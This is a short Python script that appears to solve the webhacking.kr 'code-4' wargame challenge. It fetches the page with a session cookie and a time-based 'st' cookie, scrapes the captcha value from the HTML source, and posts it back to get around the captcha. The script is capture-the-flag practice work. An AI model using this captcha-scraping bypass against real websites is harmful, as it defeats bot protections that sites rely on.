from lxml import etree
from io import StringIO
import requests
import time

parser = etree.HTMLParser()

url = "https://webhacking.kr/challenge/code-4/"
PHPSESSID = 'f2sf9sjc8sv7gdnudgpjghk5ve'
st = str(int(time.time()))
captcha_keyword = b'captcha_" value="'

cookie = {'st':st, 'PHPSESSID':PHPSESSID}

# INFORMATION GATHERING
page = requests.get(url, cookies=cookie)
html = page.content.decode("utf-8")
tree = etree.parse(StringIO(html), parser=parser)

request_data = etree.tostring(tree.getroot(),pretty_print=True,method="html")
start_idx = request_data.find(captcha_keyword)+len(captcha_keyword)

# EXPLOIT
ID = 'test'
CMT = 'test'
CAPTCHA = request_data[start_idx:start_idx+10].decode()

POST_DATA = {'id': ID, 'cmt': CMT, 'captcha': CAPTCHA}
result = requests.post(url, data=POST_DATA, cookies=cookie)

print(result.text)
